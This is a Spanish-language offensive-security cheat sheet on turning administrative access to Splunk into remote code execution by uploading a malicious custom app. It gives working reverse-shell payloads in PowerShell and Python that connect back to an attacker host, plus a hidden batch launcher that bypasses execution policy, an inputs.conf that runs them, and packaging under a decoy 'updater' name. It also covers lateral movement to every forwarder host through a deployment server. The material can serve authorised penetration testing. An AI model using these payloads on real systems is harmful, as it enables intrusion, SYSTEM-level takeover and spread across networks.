---
tags:
  - webapp
  - splunk
  - attack
---
## Conceptos Clave (TL;DR)

- El acceso administrativo a Splunk puede escalarse a Ejecución Remota de Código (RCE) subiendo una aplicación personalizada.
- Splunk incorpora Python por defecto, lo que facilita la ejecución de scripts (Python, PowerShell, Bash o Batch) integrados en la aplicación.
- El vector de ataque consiste en empaquetar un script malicioso junto con un archivo de configuración (`inputs.conf`) y subirlo a través de la interfaz web "Install app from file".

## Herramientas Clave

- **Splunk Web Interface:** Utilizada para subir el archivo `.tar.gz` o `.spl` malicioso.
- **tar:** Herramienta de compresión para crear el paquete de la aplicación con la estructura de directorios correcta.
- **Python / PowerShell:** Utilizados para programar la reverse shell dependiendo del sistema operativo objetivo (Python funciona nativo en el servidor Splunk, PowerShell es mejor para Universal Forwarders en Windows).
- **Netcat / Socat:** Utilizados para crear el listener en la máquina atacante y recibir la reverse shell.

## Metodología Paso a Paso

### 1. Preparación de la Estructura de Directorios

Splunk requiere una estructura específica para reconocer la aplicación. Se deben crear dos carpetas principales: `bin` (donde residirán los scripts ejecutables) y `default` (donde residirá el archivo de configuración `inputs.conf`).

### 2. Creación del Archivo de Configuración (inputs.conf)

El archivo `inputs.conf` le indica a Splunk qué script ejecutar, con qué frecuencia (intervalo en segundos) y asegura que la aplicación esté habilitada.

### 3. Creación de los Scripts y Payloads

Se debe depositar el payload (reverse shell en Python o PowerShell) dentro del directorio `bin`. En el caso de Windows, se recomienda crear un archivo `.bat` que invoque la ejecución del script de PowerShell para evadir restricciones de ejecución.

### 4. Empaquetado de la Aplicación

Una vez que la estructura y los archivos están listos, se debe comprimir el directorio principal en un formato compatible (`.tar.gz` o `.spl`) para poder subirlo.

### 5. Configuración del Listener y Despliegue

Antes de subir el archivo, se debe configurar un listener en la máquina atacante. Luego, desde la interfaz de Splunk, se navega a la sección de instalación de aplicaciones, se sube el archivo empaquetado y, al habilitarse automáticamente, Splunk ejecutará el script devolviendo la reverse shell (típicamente como `NT AUTHORITY\SYSTEM` en Windows).

## Cheat Sheet de Comandos

```bash
# Crear la estructura de directorios necesaria para la aplicación personalizada de Splunk 
mkdir -p splunk_shell/bin splunk_shell/default
```

```ini
# Configuración de inputs.conf (Guardar en splunk_shell/default/inputs.conf) 
# Define la ruta del script, habilita la ejecución (disabled = 0) y define el intervalo de ejecución en segundos 
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

```powershell
# Payload Reverse Shell en PowerShell (Guardar en splunk_shell/bin/run.ps1) 
# Establece una conexión TCP hacia el atacante y redirige la entrada/salida estándar 
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<ATTACKER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```batch
# Wrapper Batch para ejecutar el script de PowerShell en Windows (Guardar en splunk_shell/bin/run.bat) 
# Ejecuta PowerShell ignorando políticas de ejecución y de forma oculta 
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

```python
# Payload Reverse Shell en Python para Linux (Guardar en splunk_shell/bin/rev.py) 
# Importa librerías estándar, conecta al atacante y genera una terminal bash interactiva con pty 
import sys,socket,os,pty

ip="<ATTACKER_IP>"
port="<ATTACKER_PORT>"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

```bash
# Empaquetar la aplicación en un archivo tarball comprimido 
# Crea un archivo .tar.gz conteniendo toda la estructura y scripts de la aplicación 
tar -cvzf updater.tar.gz splunk_shell/
```

```bash
# Iniciar un listener con Netcat en la máquina del atacante 
# Escucha conexiones entrantes en el puerto especificado de forma numérica y verbose 
sudo nc -lnvp <ATTACKER_PORT>
```

## "Gotchas" y Troubleshooting

- **Persistencia de Ejecución:** El parámetro `interval` en `inputs.conf` es obligatorio; si no está presente, el script no se ejecutará. El valor siempre se define en segundos.
- **Privilegios:** En entornos Windows, la ejecución de la reverse shell a través de este método suele otorgar privilegios máximos (`NT AUTHORITY\SYSTEM`).
- **Limitaciones de Python en Windows Forwarders:** Aunque el servidor Splunk trae Python instalado, los Universal Forwarders no. En entornos con muchos equipos Windows, es obligatorio usar aplicaciones basadas en PowerShell para estos agentes.
- **Movimiento Lateral Avanzado (Deployment Servers):** Si el servidor Splunk comprometido actúa como "Deployment Server", se puede lograr RCE en todos los hosts que tengan Universal Forwarders instalados moviendo la aplicación al directorio `$SPLUNK_HOME/etc/deployment-apps`.
- **Edición Previa:** Recuerda editar siempre las IPs y Puertos en el script correspondiente (`rev.py` o `run.ps1`) antes de generar el archivo `.tar.gz`.